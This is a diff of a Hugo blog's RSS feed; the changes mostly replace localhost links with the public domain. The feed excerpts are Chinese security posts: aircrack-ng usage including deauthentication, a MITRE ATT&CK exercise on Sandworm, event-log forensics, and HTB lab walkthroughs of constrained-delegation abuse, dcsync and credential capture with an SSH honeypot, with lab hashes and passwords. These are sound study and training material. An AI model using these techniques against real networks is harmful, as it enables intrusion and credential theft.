@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>wackymaker</title>
-        <link>http://localhost:1313/</link>
+        <link>https://wackymaker.github.io/</link>
         <description>Recent content on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 30 Aug 2025 23:19:01 +0800</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 30 Aug 2025 23:19:01 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>aircrack-ng套件</title>
-        <link>http://localhost:1313/post/aircrack/</link>
+        <link>https://wackymaker.github.io/post/aircrack/</link>
         <pubDate>Sat, 30 Aug 2025 23:19:01 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/aircrack/</guid>
+        <guid>https://wackymaker.github.io/post/aircrack/</guid>
         <description>&lt;h2 id=&#34;aircrack-ng套件介绍&#34;&gt;aircrack-ng套件介绍
 &lt;/h2&gt;&lt;p&gt;只要学习无线安全，Aircrack-ng套件就是需要接触的内容，其包含20多种专门用于审核wifi网络的攻击，并且都是命令行，我今天只会简要记录几个常用工具&lt;/p&gt;
 &lt;h3 id=&#34;airmon-ng快捷监控&#34;&gt;Airmon-ng(快捷监控)
@@ -200,7 +200,7 @@
 &lt;p&gt;生成客户端与ap关系图CAPR,生成的图片会可视化当前的ap和客户端连接情况&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airgraph-ng -i wacky-01.csv -g CAPR -o CAPR.png
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;类似如下效果&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/air/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/air/image.png&#34;
 	
 	
 	
@@ -210,7 +210,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;还可以生成通用探针图CPG生成的图片会可视化当前ap和所有客户端的联系，包括并没有接入或者准备接入网络的客户端&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airgraph-ng -i wacky-01.csv -g CPG -o CAPR.png
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/air/image-1.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/air/image-1.png&#34;
 	
 	
 	
@@ -236,7 +236,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c 00：0F：B5：32：31：31 是要取消身份验证的客户端的 MAC 地址;如果省略，则连接的所有客户端都会被攻击
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;airdecap-ng解密无线流量&#34;&gt;Airdecap-ng（解密无线流量）
 &lt;/h3&gt;&lt;p&gt;当我们抓取wifi流量包后会发现抓取协议都是802.11&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/air/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/air/image-2.png&#34;
 	
 	
 	
@@ -285,7 +285,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Number of bad TKIP &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;WPA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; packets         &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Number of bad CCMP &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;WPA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; packets         &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解密后流量就是正常的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/air/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/air/image-3.png&#34;
 	
 	
 	
@@ -299,17 +299,17 @@
         </item>
         <item>
         <title>UFO-1-wp</title>
-        <link>http://localhost:1313/post/ufo/</link>
+        <link>https://wackymaker.github.io/post/ufo/</link>
         <pubDate>Sat, 30 Aug 2025 18:04:36 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/ufo/</guid>
+        <guid>https://wackymaker.github.io/post/ufo/</guid>
         <description>&lt;p&gt;这两天写了两篇文章一篇adcs的恶意模板发布还有shadowslnk利用，但这两篇文章我需要去先知赚点稿费，所以先等他们过审了才能传到这边。今天做个情报分析就差不多了。&lt;/p&gt;
 &lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;在 ICS 行业，您的安全团队始终需要保持最新状态，并且应该了解针对您所在行业组织的威胁。您刚开始担任威胁情报实习生，具有一些 SOC 经验。您的经理给了您一项任务，以测试您的研究技能以及您如何利用 Mitre Att&amp;amp;ck 来发挥自己的优势。对 Sandworm Team（也称为 BlackEnergy Group 和 APT44）进行研究。利用 Mitre ATT&amp;amp;CK 了解如何以可作的形式映射对手的行为和战术。粉碎评估并给您的经理留下深刻印象，因为威胁情报是您的热情所在。&lt;/p&gt;
 &lt;h2 id=&#34;task1&#34;&gt;task1
 &lt;/h2&gt;&lt;p&gt;根据 Mitre 援引的消息来源，沙虫团队是哪一年开始行动的？&lt;/p&gt;
 &lt;p&gt;打开矩阵，我们能搜索Sandworm Team，我们可以看到这是一个来自俄罗斯的军事组织，最早行动于2009年&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image.png&#34;
 	
 	
 	
@@ -321,7 +321,7 @@
 &lt;h2 id=&#34;task2&#34;&gt;task2
 &lt;/h2&gt;&lt;p&gt;Mitre 指出，在 2016 年针对乌克兰电网的一次运动中，BlackEnergy 集团使用了两种凭证访问技术来访问受感染网络中的多个主机。一种是 LSASS 内存访问 （T1003.001）。另一个的攻击 ID 是什么？&lt;/p&gt;
 &lt;p&gt;转到此组织2016针对乌克兰电力系统的攻击，进入矩阵&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-1.png&#34;
 	
 	
 	
@@ -334,7 +334,7 @@
 &lt;h2 id=&#34;task3&#34;&gt;task3
 &lt;/h2&gt;&lt;p&gt;在 2016 年的活动中，观察到对手在行动中使用了 VBS 脚本。VBS 文件的名称是什么？&lt;/p&gt;
 &lt;p&gt;不用进入矩阵，直接在2016行动全局搜索vbs&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-2.png&#34;
 	
 	
 	
@@ -346,7 +346,7 @@
 &lt;h2 id=&#34;task4&#34;&gt;task4
 &lt;/h2&gt;&lt;p&gt;APT 在 2022 年开展了一场重大运动。服务器应用程序被滥用以保持持久性。该组使用持久性技术允许他们进行远程访问的 Mitre Att&amp;amp;ck ID 是什么？&lt;/p&gt;
 &lt;p&gt;转到2022的攻击记录，发现还是乌克兰的电力系统，这俄罗斯去乌克兰系统和回家没什么区别&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-3.png&#34;
 	
 	
 	
@@ -355,7 +355,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;不用进入矩阵，可以直接看到是利用webshell进行权限维持的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-4.png&#34;
 	
 	
 	
@@ -371,7 +371,7 @@
 &lt;h2 id=&#34;task6&#34;&gt;task6
 &lt;/h2&gt;&lt;p&gt;在 2022 年的同一活动中，该组织滥用了哪个 SCADA 应用程序二进制文件来在 SCADA Systems 上实现代码执行？&lt;/p&gt;
 &lt;p&gt;往下找我们能找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-5.png&#34;
 	
 	
 	
@@ -386,7 +386,7 @@
 &lt;p&gt;答案：C:\sc\prog\exec\scilc.exe -do pack\scil\s1.txt&lt;/p&gt;
 &lt;h2 id=&#34;task8&#34;&gt;task8
 &lt;/h2&gt;&lt;p&gt;在同一活动期间，使用什么恶意软件/工具在受感染的环境中进行数据销毁？&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-7.png&#34;
 	
 	
 	
@@ -399,7 +399,7 @@
 &lt;p&gt;答案：CaddyWiper&lt;/p&gt;
 &lt;h2 id=&#34;task9&#34;&gt;task9
 &lt;/h2&gt;&lt;p&gt;问题 8 中确定的恶意软件/工具还具有其他功能。它可以在执行策略中执行的特定技术的 Mitre Att&amp;amp;ck ID 是什么？&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-8.png&#34;
 	
 	
 	
@@ -412,7 +412,7 @@
 &lt;h2 id=&#34;task10&#34;&gt;task10
 &lt;/h2&gt;&lt;p&gt;众所周知，Sandworm 团队在他们的活动中使用不同的工具。它们与自动传播的恶意软件相关联，该恶意软件充当勒索软件，同时具有类似蠕虫的功能 .这个恶意软件的名称是什么？&lt;/p&gt;
 &lt;p&gt;回到此apt主页，检索其使用工具&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-9.png&#34;
 	
 	
 	
@@ -420,7 +420,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-10.png&#34;
 	
 	
 	
@@ -436,7 +436,7 @@
 &lt;h2 id=&#34;task12&#34;&gt;task12
 &lt;/h2&gt;&lt;p&gt;该组织用于针对调制解调器的恶意软件/工具的名称是什么？&lt;/p&gt;
 &lt;p&gt;同上方法一样可以找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-11.png&#34;
 	
 	
 	
@@ -448,7 +448,7 @@
 &lt;h2 id=&#34;task13&#34;&gt;task13
 &lt;/h2&gt;&lt;p&gt;威胁行为者还在其基础架构中使用非标准端口，以达到运营安全目的。据报道，Sandworm 团队在哪个端口上建立了用于监听的 SSH 服务器？&lt;/p&gt;
 &lt;p&gt;枚举ssh能找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-12.png&#34;
 	
 	
 	
@@ -460,7 +460,7 @@
 &lt;h2 id=&#34;task14&#34;&gt;task14
 &lt;/h2&gt;&lt;p&gt;沙虫小组得到了另一个 APT 小组的协助进行各种行动。已知哪个特定团体与他们合作？&lt;/p&gt;
 &lt;p&gt;最开始的简介指出了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-13.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-13.png&#34;
 	
 	
 	
@@ -474,13 +474,13 @@
         </item>
         <item>
         <title>wifi网卡简记</title>
-        <link>http://localhost:1313/post/wifiinterfaces/</link>
+        <link>https://wackymaker.github.io/post/wifiinterfaces/</link>
         <pubDate>Thu, 28 Aug 2025 22:51:00 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/wifiinterfaces/</guid>
+        <guid>https://wackymaker.github.io/post/wifiinterfaces/</guid>
         <description>&lt;h2 id=&#34;wifi接口&#34;&gt;wifi接口
 &lt;/h2&gt;&lt;p&gt;无线接口是进行 Wi-Fi 渗透测试的关键。毕竟我们的设备就是通过它们来发送和接收数据的。在选购合适的无线接口时，有很多方面需要考虑。如果选了性能太弱的接口，在渗透测试时可能抓不到任何数据。这一部分就是简单研究一下我买的这个小接口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/wifiInterfaces/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/wifiInterfaces/image.png&#34;
 	
 	
 	
@@ -655,10 +655,10 @@
         </item>
         <item>
         <title>Phantom-check-wp</title>
-        <link>http://localhost:1313/post/phantom-check/</link>
+        <link>https://wackymaker.github.io/post/phantom-check/</link>
         <pubDate>Thu, 28 Aug 2025 16:05:44 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/phantom-check/</guid>
+        <guid>https://wackymaker.github.io/post/phantom-check/</guid>
         <description>&lt;h2 id=&#34;题目简介与题目附件&#34;&gt;题目简介与题目附件
 &lt;/h2&gt;&lt;p&gt;Talion 怀疑威胁行为者进行了反虚拟化检查，以避免在沙盒环境中被检测到。您的任务是分析事件日志并确定用于虚拟化检测的特定技术。Byte Doctor 需要攻击者执行这些检查的注册表检查或进程的证据。&lt;/p&gt;
 &lt;p&gt;附件提供如下&lt;/p&gt;
@@ -702,7 +702,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;初心忘るべからず - Shoshin Wasuru Bekarazu - Never forget the beginner&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s mind.
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果不多，就直接看即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image.png&#34;
 	
 	
 	
@@ -716,7 +716,7 @@
 &lt;/h2&gt;&lt;p&gt;攻击者是用哪条 WMI 命令查当前机器温度的？&lt;/p&gt;
 &lt;p&gt;比较典型的绕沙箱策略，检测实体机的硬件温度进行判断&lt;/p&gt;
 &lt;p&gt;在刚才调用wmi的查询当中，我们能检索Temperature找到目标&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-1.png&#34;
 	
 	
 	
@@ -751,7 +751,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✔ Include noisy rules? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; rules&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; · yes
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✔ Include sysmon rules? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2,305 rules&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; · yes
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在生成所有规则过滤后，我们筛选出function&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-2.png&#34;
 	
 	
 	
@@ -766,7 +766,7 @@
 &lt;p&gt;查询注册表的话，我们先直接从原时间过滤出注册表相关信息&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hayabusa search -f Windows-Powershell-Operational.evtx -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM&amp;#34;&lt;/span&gt; -J -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM.json&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;筛选后获得&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-3.png&#34;
 	
 	
 	
@@ -785,7 +785,7 @@
 &lt;/h2&gt;&lt;p&gt;VM 检测脚本打印前缀为“This is a”的任何检测。脚本检测到哪两个虚拟化平台？&lt;/p&gt;
 &lt;p&gt;一样的过滤关键词&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hayabusa search -f Windows-Powershell-Operational.evtx -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;This is a&amp;#34;&lt;/span&gt; -J -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;this.json&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-4.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-4.png&#34;
 	
 	
 	
@@ -798,10 +798,10 @@
         </item>
         <item>
         <title>不可转发情况下的约束委派攻击</title>
-        <link>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
+        <link>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
         <pubDate>Thu, 28 Aug 2025 13:43:59 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
+        <guid>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
         <description>&lt;p&gt;要理解不可转发约束委派为何是难以被攻击的，我们需要了解约束委派本身&lt;/p&gt;
 &lt;h2 id=&#34;约束委派简介&#34;&gt;约束委派简介
 &lt;/h2&gt;&lt;p&gt;简单来说，约束委派是域内的一种机制：允许某个账号（如sever1$)，以其他用户的身份访问特定服务（如 HTTP/dc01.corp.local）。&lt;/p&gt;
@@ -814,7 +814,7 @@
 &lt;p&gt;实验环境如下 IP：10.129.194.21；FQDN：DC01.rebound.htb；具有委派的用户信息：delegator$/c5c2c04a2590c117fa9e1a07a110dad3，和一个普通域用户：ldap_monitor/1GR8t@$$4u&lt;/p&gt;
 &lt;p&gt;使用工具如下：impacket包&lt;/p&gt;
 &lt;p&gt;在开始攻击之前，可以通过下面看到delegator$确实配置了约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image.png&#34;
 	
 	
 	
@@ -823,7 +823,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是当我们直接请求管理员的时候会报错&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-1.png&#34;
 	
 	
 	
@@ -833,7 +833,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;其中报错点明了Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable，也就是tgt可能不存在forwardable所以不允许转发票据&lt;/p&gt;
 &lt;p&gt;这时如果我们抓取猎犬如果看到了这个机器用户存在注册服务，就像这样&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-2.png&#34;
 	
 	
 	
@@ -845,7 +845,7 @@
 &lt;h2 id=&#34;实际操作&#34;&gt;实际操作
 &lt;/h2&gt;&lt;p&gt;具体做法如下&lt;/p&gt;
 &lt;p&gt;首先将delegator$msDS-AllowedToActOnBehalfOfOtherIdentity属性写入ldap_monitor，将其拥有对delegator$打rbcd的权限，其实也就是为了提前一步伪造为任意用户&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-3.png&#34;
 	
 	
 	
@@ -854,7 +854,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用这层身份，我们可以ldap_monitor以任意身份请求delegator$注册的服务，这里我们直接以dc的机器用户请求&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-4.png&#34;
 	
 	
 	
@@ -863,7 +863,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;现在我们以及完成了提前一步伪造为我们需要的用户，接下来我们就能直接拿着这张票据去请求约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-5.png&#34;
 	
 	
 	
@@ -873,7 +873,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;而这张票据就是我们成功以dc01$的身份在没有开启协议转换的情况下请求了约束委派的服务&lt;/p&gt;
 &lt;p&gt;而我们可以利用它去打dcsync，其结果证明了我们的成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-6.png&#34;
 	
 	
 	
@@ -895,10 +895,10 @@
         </item>
         <item>
         <title>sweep-wp</title>
-        <link>http://localhost:1313/post/sweep-htb/</link>
+        <link>https://wackymaker.github.io/post/sweep-htb/</link>
         <pubDate>Wed, 27 Aug 2025 23:00:26 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/sweep-htb/</guid>
+        <guid>https://wackymaker.github.io/post/sweep-htb/</guid>
         <description>&lt;h2 id=&#34;机器简介&#34;&gt;机器简介
 &lt;/h2&gt;&lt;p&gt;一台中等难度的dc，来自vulnhub，但是最近并入了htb，所以我乐意在闲暇时间玩一玩&lt;/p&gt;
 &lt;p&gt;机器在开始前附带信息如下&lt;/p&gt;
@@ -1011,7 +1011,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        Lansweeper$                     Lansweeper Actions
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    INVENTORY        NETLOGON                        Logon server share 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;smb存在匿名，DefaultPackageShare$特殊目录当中只有一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image.png&#34;
 	
 	
 	
@@ -1145,7 +1145,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 49S
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250827100014_bloodhound.zip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个用户没有出站，但是能看到有个额外的域管，或许后面会有用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-1.png&#34;
 	
 	
 	
@@ -1155,7 +1155,7 @@
 &gt;&lt;/p&gt;
 &lt;h2 id=&#34;ssh蜜罐&#34;&gt;ssh蜜罐
 &lt;/h2&gt;&lt;p&gt;这个用户局外没什么用了，用来登陆管理平台试试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-2.png&#34;
 	
 	
 	
@@ -1164,7 +1164,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这个用户并不够权限执行我枚举到的后台shell利用&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-3.png&#34;
 	
 	
 	
@@ -1194,7 +1194,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Host key &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/wackymaker/.local/share/sshesame/host_ed25519_key&amp;#34;&lt;/span&gt; not found, generating it
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO 2025/08/27 10:23:01 Listening on 10.10.16.22:2222
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在扫描凭证-添加扫描目标中，选择扫描ip范围，选定我们蜜罐的范围，并选择2222端口（只显示22是因为它只显示两位数字）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-4.png&#34;
 	
 	
 	
@@ -1203,7 +1203,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且在扫描凭据这里，将凭据映射绑定到ip范围的linux主机上，这样它就会利用保存凭证进行ssh登陆我们的蜜罐&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-5.png&#34;
 	
 	
 	
@@ -1266,7 +1266,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;20348&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:INVENTORY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:sweep.vl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
